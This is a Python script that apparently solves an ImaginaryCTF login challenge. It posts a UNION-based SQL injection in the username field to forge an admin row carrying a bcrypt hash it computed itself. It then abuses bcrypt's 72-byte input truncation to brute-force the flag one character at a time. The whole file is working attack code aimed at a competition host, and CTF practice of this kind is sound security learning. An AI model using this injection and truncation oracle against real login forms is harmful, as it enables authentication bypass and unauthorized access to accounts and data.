import requests, string, bcrypt
table = string.ascii_letters+string.digits+"?!$:=,-|\\/!{@_}"

url = "http://login.chal.imaginaryctf.org/"
params = {"688a35c685a7a654abc80f8e123ad9f0": "123"}

salt = bcrypt.gensalt()

success = "Welcome admin"
result = "ictf{"

while not result.endswith("}"):
    prefix = "a" * (72 - len(result) - 1)
    for c in table:
        temp = result + c
        payload = prefix + temp
        hash = bcrypt.hashpw(payload.encode('utf-8'), salt).decode('utf-8')
        data = {
            "username": f"adminasdasdasd' union select 'admin', '{hash}' -- -",
            "password": prefix
        }
        response = requests.post(url=url, data=data, params=params)
        if (success in response.text):
            result = temp
            print("flag now: " + result)
            print("-"*20)
            break
        else:
            print(temp, "<-- fail")
            print("-"*20)

print(result)